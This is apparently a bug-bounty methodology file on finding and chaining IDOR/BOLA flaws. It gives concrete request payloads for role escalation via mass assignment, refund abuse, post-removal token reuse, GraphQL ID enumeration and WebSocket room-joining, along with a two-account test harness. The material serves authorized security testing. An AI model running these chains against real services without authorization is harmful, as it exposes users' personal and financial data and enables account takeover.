- **B.** `node(id:"<victim_gid>") { ... on Customer { email orders { totalPrice paymentMethods { cardLast4 } } } }` — the top-level `node()` resolver auths the requester, but nested relations don't re-check ownership against the resolved Customer.
- **C.** Iterate IDs (decoding base64 to extract numeric, incrementing) to exfil emails, order totals, payment methods across the entire customer base.
- **Impact:** Mass cross-tenant PII / financial data extraction. Single bug, full database.
- **Real shape:** Shopify Billing IDOR H1 #2207248 ($5,000); HackerOne PolicyPageAssetGroup IDOR H1 #1618347 ($25,000). Cross-refs `hunt-graphql` Disclosed Report Citation #5 and #2.

### Chain 4 — IDOR on `/api/teams/{id}/members` + Mass-Assignment in Body → Role Escalation on Victim Team

- **A.** Standard horizontal IDOR — `POST /api/teams/{victim_team_id}/members {"email":"attacker@evil"}` adds attacker as a normal member without ownership check.
- **B.** The body accepts additional fields the API didn't filter: `{"email":"attacker@evil", "role":"OWNER", "permissions":["*"]}` — mass assignment leaks into the role field.
- **C.** Attacker is added to the victim team as OWNER. Now has full admin access to the victim team's resources and can remove the real owners.
- **Impact:** Cross-tenant privilege escalation via IDOR + mass assignment. The single most efficient takeover chain on SaaS team-management APIs.
- **Real shape:** Shopify undocumented `fileCopy` mutation H1 #981472 (2020, $2,000); Stripe `UpdateAtlasApplicationPerson` cross-tenant mutation H1 #1066203 (2020). Cross-refs `hunt-graphql` Disclosed Report Citation #7 and #8; pairs with `hunt-api-misconfig` Mass Assignment section.

### Chain 5 — Soft-Delete IDOR + Post-Removal Token Validity → Persistent Cross-Tenant Access

- **A.** Identify the "remove member" endpoint that flips an `active=false` flag but doesn't invalidate the session/PAT.
- **B.** Log in as the to-be-removed user; capture session cookie or PAT.
- **C.** Have the org admin remove the user via the normal flow. Wait. Re-issue API calls using the captured token — IDOR is now *temporal* (the user no longer has permission per the policy table, but the cached auth context still passes).
- **Impact:** Weeks of post-termination cross-tenant access; GDPR/CCPA breach exposure; potential extortion leverage.
- **Real shape:** Shopify removed-staff persistence class (2022). Cross-refs `hunt-misc` Chain 1 — same root cause shape, different starting primitive.

### Chain 6 — Double-IDOR (`/users/{id}/orders → /orders/{order_id}/refund`) → Financial Impact on Victim Merchant

- **A.** First IDOR: `GET /api/users/{victim_id}/orders` returns the victim's order list without ownership check — yields legitimate `order_id` values.
- **B.** Second IDOR: `POST /api/orders/{order_id}/refund` issues refunds without checking that the requester owns the merchant/order.
- **C.** Trigger refund on each of the victim merchant's recent orders. Money moves from merchant to customer (who is also attacker-controlled).
- **Impact:** Direct financial loss to the victim merchant. Mass-exploitable across the platform's merchant base.
- **Real shape:** Multiple disclosed e-commerce platform IDOR chains 2019-2023. Cross-refs `hunt-business-logic` Chain (financial impact via state-machine confusion).

### Operator-level pattern

When you confirm a read-IDOR at A, immediately ask: *what state-change accepts the same ID and might also be IDOR'd?* The chain is usually one of: (1) password reset / email change at terminal step → ATO; (2) refund / withdraw / transfer → financial; (3) role-change / membership-add → privilege escalation. If your read-IDOR doesn't compose to one of those, the standalone payout is what you get. Hunt for both halves — the second is often easier to find because it shares the same auth bug class as the first.

Cross-references:
- `hunt-ato` — Chain 1, 5
- `hunt-xss` — Chain 2
- `hunt-graphql` — Chains 3, 4
- `hunt-misc` — Chain 5
- `hunt-business-logic` — Chain 6

---

## GraphQL IDOR when introspection is disabled — APQ / persisted operations

Step 6 above assumes `{ __schema { ... } }` works. On a modern SPA it usually does not: introspection is
off and the API is served through **Apollo APQ** (Automatic Persisted Queries). The schema is shut, but
the *operations* are not — and IDOR only needs the ops that take an id.

**Harvest operations from the page's own network log instead of the schema.** Inside the logged-in tab:

```js
// /evaluate
JSON.stringify(performance.getEntriesByType('resource').map(e=>e.name).filter(n=>/gql/.test(n)))
```

yields real persisted paths of the shape
`/api/pub/gql/<skin>/<Operation>/<sha256>?variables={...}` and
`/api/auth/gql/<skin>/<Operation>/<sha256>?mutation=1&variables={...}`

- A bogus hash returns `{"errors":[{"message":"PersistedQueryNotFound"}]}` — the query body is fixed, so
  you can invoke registered ops but not craft new ones. That is enough: you are looking for ops that
  already accept an object id.
- `waymore` / `gau` on the domain surface the same persisted URLs from public archives — harvest with no
  browser and no login.
- Error text leaks schema for free: `Cannot query field "x" on type "T". Did you mean "y"?`,
  `Variable "$cityId" of required type "String!" was not provided.`

**Then run the per-op two-account differential.** Read each op's `variables=`, and for any that carries a
caller-supplied id (`userId`, `id`, `orgId`, `contextId`…) replay it from account A using **B's** id.

| observation | verdict |
|---|---|
| A + `{userId:B}` returns **B's** data | **IDOR confirmed** — report it |
| A + `{userId:B}` returns **A's own** data (var ignored) | resolver is session-scoped — safe |
| unauth + `{userId:A}` → `[]`, auth + `{userId:A}` → A's data | auth gate present; cross-user still needs testing |
| A + `{userId:B}` → `[]` while A's own is non-empty, **and B owns nothing** | **inconclusive** |

**The last row is the trap that wastes a report.** An empty array distinguishes nothing: "scoped to the
caller" and "that user simply has no rows" produce the identical response. **Seed the victim account with
at least one object before comparing**, or every cross-user test reads as a false negative.

The strongest evidence is the **contrast on the same API**: one op honouring a foreign id while a sibling
op ignores it proves the honouring one is an oversight, not a design choice. Say so in the report.

Verified 2026-10 (CH Media / sunshine.ch): ops mined from `performance.*`; `FavouriteStreams(userId)`
returned B's favourites to A (IDOR), while `UserProfile` ignored `userId`/`id` entirely and stayed
session-scoped. Same endpoint family, opposite behaviour — the pair is what made the finding defensible.

## Eskalasi wajib (jangan berhenti di kelas ini)

**Primitif:** baca/tulis objek milik pihak lain

**Teknik pengembangan:** baca token/email korban -> ATO; tulis field role -> privesc; ubah order/amount -> financial impact

**Eskalasi ke:** `hunt-ato` · `hunt-data-exposure` · `hunt-business-logic`

**Depth target:** L2 -> L5

Satu temuan di kelas ini WAJIB menyebut eskalasi berikutnya (atau alasan primitif habis).
Lihat `exploit-chain-graph` + `exploit-depth` (L0-L5). `depth_gate.py` memblokir temuan
yang buktinya cuma status code.

## Related Skills & Chains

- **Surface atlas** (`security/bb-audit-launcher/references/ato-idor-ssrf-surface-atlas.md`) — the 31 trigger surfaces for ATO / IDOR-BOLA / SSRF: where to look, what proves it, and the severity per surface. This skill is the depth; the atlas is the coverage checklist.

- **`hunt-auth-bypass`** — Object-level authorization failure plus route-level auth absence is the canonical IDOR-amplifier. Chain primitive: missing `req.user.id` scoping in ORM query + missing middleware on legacy `/v1/` route = unauthenticated cross-tenant data read via direct ID substitution → bulk PII dump without any session at all.
- **`hunt-ato`** — Profile-edit IDOR is the most direct path from "read someone's data" to "own their account." Chain primitive: `PATCH /api/users/{victim_uid}` accepts attacker's session + victim UID → set `email=attacker@evil.com` → trigger password reset → reset link arrives at attacker → full ATO without ever knowing victim credentials.
- **`hunt-graphql`** — GraphQL resolvers without field-level authorization are IDOR-by-default; introspection hands you the schema. Chain primitive: `__schema` introspection → enumerate every mutation accepting `id:` argument → substitute victim IDs across `updateUser`, `deleteOrg`, `transferBilling` mutations → mass IDOR fan-out from one introspection query.
- **`security-arsenal`** — Pull the IDOR Bypass Tables section for HTTP-parameter-pollution payloads (`?id=own&id=victim`), nested-JSON wrappers (`{"data":{"id":"VICTIM"}}`), and parameter-name variations (`uid`/`userId`/`user_id`/`account`) when the first direct substitution returns 403.
- **`triage-validation`** — Run the Pre-Severity Gate before claiming Critical on an IDOR that returns 200 but doesn't actually leak data (empty array, redacted fields, "access denied" in body with 200 status). The 200-but-no-data IDOR is the #1 N/A driver on H1/Bugcrowd.

---

## 2026 techniques (dork pass 2026-10-18)

- **CVE-2026-25197** — Gardyn Home Kit: authorization bypass through user-controlled key
  (CWE-639). Two REST endpoints return user data with **no per-user authorization check**:
  `/api/users` returns the full user list with **no authentication at all**, and
  `/api/user/{id}` returns any profile without verifying the requester may access it.
  Lesson: test the *collection* endpoint first — unauth user listing is the cheapest IDOR
  primitive and often the highest-severity one.

---

## Reference — PayloadsAllTheThings (extracted 2026-10-17)

`security/bug-bounty/references/pat-techniques/idor.md` (7.4KB, 130 lines) — PAT
"Insecure Direct Object References" section: object-reference enumeration, ID
encoding/prediction patterns, parameter-name variation tables, and the
UUID-vs-sequential trade-off. Raw-payload shelf behind this skill's techniques.
Cadangan versi komunitas: `references/cbh-hunt-skills/hunt-idor.md` (21.3KB).


## 2026 sweep (dork pass 2026-10-18 — 1 repo)

- **Aavishkar Institute Management System — broken access control, unauth access to all records** (`Harshsanghvi108/CVE-2026-PENDING-AAVISHKAR-1` ★0)
  - fail silently. Any unauthenticated remote attacker can access all
  - Because HTML is echoed before session_start() and header() are called,


## 2026 sweep 5 (dork pass 2026-10-18 — 1 repo)

- CVE-2026-93399 — Bookly ≤28.2 **unauthenticated IDOR → PII leak → RCE**: inject `form_data[order_id] = VICTIM_ID` into `getFormId`, then `renderComplete` leaks the victim's order token via `Order::query()`. Lesson: a leaked *token* is often the second step that turns an IDOR into a full takeover.
  - Step 1: getFormId → inject form_data[order_id] = VICTIM_ID (IDOR)
  - Step 2: renderComplete → leak victim order token via Order::query()

---

## Harness 2-identitas (2026-10-18) — IDOR jadi TERUKUR, bukan observasi

`scripts/identity_harness.py` mengubah prosedur manual di atas menjadi alat:

```bash
# 1. capture sesi dua akun (akun tes bikinan sendiri — lihat disposable-auth-identity)
python identity_harness.py capture --label a --url https://t/login --data 'u=a&p=x'
python identity_harness.py capture --label b --url https://t/login --data 'u=b&p=x'

# 2. diff: request SAMA dari dua identitas + kontrol anon
python identity_harness.py diff --label-a a --label-b b \
  --urls https://t/api/orders https://t/api/users/1 https://t/api/me

# 3. sweep: harvest id dari response A, cek akses dari B
python identity_harness.py ids --from a --label-b b \
  --harvest https://t/api/orders --url 'https://t/api/orders/{id}'
```

Sinyal yang dicari otomatis:
- `BOTH-200-DIFFERENT-BODY` → B melihat data A = **BOLA**
- `ANON-READABLE` → akses tanpa auth = **primitive termurah**
- `B-ALLOWED-A-DENIED` → kebalikan, cek role

Bukti JSON: `evidence/<stamp>-diff.json` / `-ids.json` (status, len, sha256 per request).
Read-only default: method non-GET butuh `--allow-write` eksplisit.

---

## Latihan dulu di lab lokal (2026-10-18)

Sebelum probe di atas dijalankan pada target nyata, tekniknya bisa diverifikasi di
`local-vuln-lab` (Juice Shop :3000 untuk IDOR/ATO, DVWA :4280 untuk RCE/LFI).
Tujuannya: pastikan probe benar-benar bekerja, bukan cuma terlihat benar di dokumen.


## Critical severity anchor (kelas ini bisa Critical — syaratnya)

Cross-tenant read pada UUID yang tidak enumerable + data low-sensitivity = Low (argued Medium). Critical/High butuh: write primitive, PII/financial, atau rantai ke ATO. Kalibrasi: JANGAN downgrade hanya karena 'id tidak guessable' — severity ditentukan oleh apa yang bocor, bukan oleh kesulitan menebak. 200 dengan array kosong = BUKAN IDOR.


## WebSocket / real-time channel BOLA (added 2026-10-30)

REST endpoints get tested; the socket that carries the same data usually does not. Realtime
channels authorize **at connect time** and then trust the client's room/channel identifier.

Test shapes:
- **Join by id** — `{"action":"join","room_id":1234}` / `subscribe {"channel":"user_5678"}` /
  `socket.emit('join', victimId)`. Swap the id for a victim's; if events for the victim arrive,
  the channel is unauthenticated per-object.
- **Subscribe to a topic you do not own** — MQTT/Redis pub-sub topic names, `room:<id>`,
  `private-user-<id>`, Socket.IO namespaces and rooms, Pusher/Ably channel names.
- **Presence / typing / cursor events** — often leak the victim's identity, activity and sometimes
  message bodies even when the main feed is authorized.
- **Message history replay** — `{"action":"history","room_id":X,"before":...}` frequently skips the
  ownership check that the live path has.
- **Handshake auth** — token in the first frame vs `Sec-WebSocket-Protocol` vs query string;
  try connecting with no token, an expired token, and a token for a different user.
- **CSWSH** — if the handshake authenticates by cookie alone and there is no Origin check, a
  malicious page can open the socket as the victim (see `hunt-websocket`).

Proof bar: two accounts. Attacker socket receives an event/message generated by the victim account,
with both frames captured. A successful `join` response with no subsequent victim data is not a
finding — it is a lead.
